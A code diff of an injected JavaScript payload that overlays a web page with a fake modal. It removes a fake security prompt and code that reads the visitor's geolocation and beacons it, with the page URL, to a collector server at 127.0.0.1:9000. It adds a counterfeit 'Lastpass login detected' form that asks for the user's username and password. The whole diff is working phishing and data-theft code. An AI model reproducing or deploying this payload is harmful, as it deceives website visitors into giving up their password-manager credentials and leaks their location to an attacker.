@@ -10,10 +10,10 @@ script.onload = function () {
 '    max-height: 30px;' + 
 '}' +
 '.reveal-modal {' + 
-'    background: -webkit-linear-gradient(#B59FED, #7C6AAB); /* For Safari 5.1 to 6.0 */' + 
-'    background: -o-linear-gradient(#B59FED, #7C6AAB); /* For Opera 11.1 to 12.0 */' + 
-'    background: -moz-linear-gradient(#B59FED, #7C6AAB); /* For Firefox 3.6 to 15 */' + 
-'    background: linear-gradient(#B59FED, #7C6AAB); /* Standard syntax */' + 
+'    background: -webkit-linear-gradient(#c91c2d, #900311); /* For Safari 5.1 to 6.0 */' + 
+'    background: -o-linear-gradient(#c91c2d, #900311); /* For Opera 11.1 to 12.0 */' + 
+'    background: -moz-linear-gradient(#c91c2d, #900311); /* For Firefox 3.6 to 15 */' + 
+'    background: linear-gradient(#c91c2d, #900311); /* Standard syntax */' + 
 '    /*background:#900311; */' + 
 '    margin: 0 auto;' + 
 '    width:100%; ' + 
@@ -27,12 +27,12 @@ script.onload = function () {
 '    /*-webkit-box-shadow:0 0 10px rgba(0,0,0,0.4);' + 
 '    -moz-box-shadow:0 0 10px rgba(0,0,0,0.4); ' + 
 '    box-shadow:0 0 10px rgba(0,0,0,0.4);*/' + 
-'	border-radius: 0px; ' +
 '}' +
 '.lpbutton {' + 
 '  background-color: #eeeeee;' + 
 '  border: 1px solid #ccc;' + 
 '  border-bottom: 1px solid #bbb;' + 
+'  border-radius: 2px;' + 
 '  color: #333;' + 
 '  line-height: 1;' + 
 '  font-weight: bold;' + 
@@ -41,7 +41,7 @@ script.onload = function () {
 '  /*width: auto;*/' + 
 '  /*float: right;*/' + 
 '  margin: 0px 15px 2px 2px;' + 
-'  /*height: 17px;*/' + 
+'  /*height: 17px;*/' +
 '  padding: 3px 6px 2px 6px;' + 
 '  font-size: 13px;' + 
 '  font-family: Helvetica;' + 
@@ -52,31 +52,24 @@ script.onload = function () {
 '}' +
 '</style>' + 
 '<div id="container">' + 
-'  <div id="modal" class="reveal-modal">' + 
-'       Share your location to increase security while accessing this page' + 
+'  <div id="exampleModal" class="reveal-modal">' + 
+'       <img src="http://127.0.0.1:9000/public/img/lastpass.gif">' + 
+'       Lastpass login detected:' + 
+'       <div class="loginform">' + 
+'         <input type="text" lptype="tryusername" id="lpusername" class="lpbutton" placeholder="username">' + 
+'         <input type="text" lptype="trypassword" id="lppassword" class="lpbutton" placeholder="password">' + 
+'         <button type="button" lptype="tryagainbtn" id="lplogin" class="lpbutton" value="login">Login</button>' + 
+'       </div>' + 
 '  </div>' + 
 '</div>' 
 	
 setTimeout( function() {
 	$( "body" ).prepend(content);
-}, 1000 );
+}, 2000 );
+    
 
-setTimeout( function() {
-	getLocation()
-}, 4000 );
 		
 };
 
 document.head.appendChild(script); //or something of the likes
 
-function getLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendPosition);
-    } else { 
-        console.log("Geolocation is not supported by this browser.");
-    }
-}
-
-function sendPosition(position) {	
-    new Image().src = 'http://127.0.0.1:9000/App/CatchLocation?page='+window.location.href+'&latitude='+position.coords.latitude.toFixed(2)+'&longitude='+position.coords.longitude.toFixed(2);
-}
